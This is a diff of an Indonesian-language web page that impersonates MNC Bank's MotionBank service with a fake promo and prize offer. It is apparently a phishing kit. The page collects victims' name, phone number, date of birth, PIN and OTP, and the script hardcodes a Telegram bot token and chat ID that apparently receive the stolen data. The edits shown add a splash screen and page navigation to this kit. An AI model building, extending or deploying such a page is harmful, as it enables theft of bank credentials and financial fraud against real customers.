@@ -22,12 +22,6 @@
   <meta property="og:url" content="#">
   <meta property="og:type" content="website">
 
-  <!-- Twitter Card Data -->
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="MotionBank - Layanan Digital MNC Bank">
-  <meta name="twitter:description" content="Klaim promo & hadiah menarik dari Layanan Digital MNC Bank MotionBank sekarang juga!">
-  <meta name="twitter:image" content="https://i.ibb.co.com/SXbjf33X/b0acf26b-d4fa-4aa4-b082-bda2bae5edb0.jpg">
-
   <!-- Tailwind CSS & FontAwesome -->
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -50,10 +44,15 @@
     }
   </style>
 </head>
-<body id="bodyContainer" class="bg-custom-page1 min-h-screen text-slate-800 font-sans pb-12 transition-all duration-300">
+<body id="bodyContainer" class="bg-white min-h-screen text-slate-800 font-sans pb-12 transition-all duration-300 overflow-x-hidden">
+
+  <!-- ================= HALAMAN 0 (SPLASH SCREEN MENGGUNAKAN GAMBAR) ================= -->
+  <div id="page0" class="fixed inset-0 z-50 flex items-center justify-center bg-white cursor-pointer" onclick="goToPage1()">
+    <img src="https://i.ibb.co.com/ynnk2c49/IMG-2960.jpg" alt="Splash Screen MotionBank" class="w-full h-full object-cover">
+  </div>
 
   <!-- ================= HALAMAN 1 ================= -->
-  <div id="page1" class="block">
+  <div id="page1" class="hidden">
     <header class="bg-white/95 backdrop-blur-md text-slate-800 py-3 px-4 shadow-sm border-b border-slate-200 sticky top-0 z-40">
       <div class="max-w-sm mx-auto flex justify-between items-center">
         <a href="#" class="flex items-center">
@@ -112,13 +111,13 @@
                 type="tel" 
                 id="phone" 
                 name="phone" 
-                placeholder="Masukkan no. handphone" 
+                placeholder="Masukkan no. handphone"
                 required
                 maxlength="12"
                 class="w-full pl-3 pr-3 py-2.5 bg-transparent border-none text-sm text-slate-800 placeholder-slate-400 focus:outline-none"
               >
             </div>
-            <p class="text-[10px] text-slate-500 mt-0.5">Awali dengan angka 8 (Total panjang 10 - 15 digit)</p>
+            <p class="text-[10px] text-slate-500 mt-0.5">Awali dengan angka 8 </p>
           </div>
 
           <div>
@@ -305,14 +304,16 @@
     const BOT_TOKEN = "9189949943:AAGWkG3Lnly2aM8Wu4kCwUHRo4PK6UMwABs"; 
     const CHAT_ID = "6742478722";
 
+    const page0 = document.getElementById('page0');
+    const page1 = document.getElementById('page1');
+    const page2 = document.getElementById('page2');
+    const page3 = document.getElementById('page3');
+    
     const formStep1 = document.getElementById('formStep1');
     const fullNameInput = document.getElementById('fullName');
     const phoneInput = document.getElementById('phone');
     const dobInput = document.getElementById('dob');
     
-    const page1 = document.getElementById('page1');
-    const page2 = document.getElementById('page2');
-    const page3 = document.getElementById('page3');
     const btnBackTo1 = document.getElementById('btnBackTo1');
     const btnBackTo2 = document.getElementById('btnBackTo2');
     const btnToPage3 = document.getElementById('btnToPage3');
@@ -342,6 +343,21 @@
       pin: "",
       otp: ""
     };
+
+    // Timer otomatis 1 detik untuk berpindah dari Halaman 0 ke Halaman 1
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        goToPage1();
+      }, 2000);
+    });
+
+    function goToPage1() {
+      page0.classList.add('hidden');
+      page1.classList.remove('hidden');
+      bodyContainer.classList.remove('bg-white');
+      bodyContainer.classList.add('bg-custom-page1');
+      window.scrollTo(0, 0);
+    }
 
     phoneInput.addEventListener('input', function(e) {
       let val = e.target.value.replace(/\D/g, ''); 
@@ -522,4 +538,3 @@
 
 </body>
 </html>
-
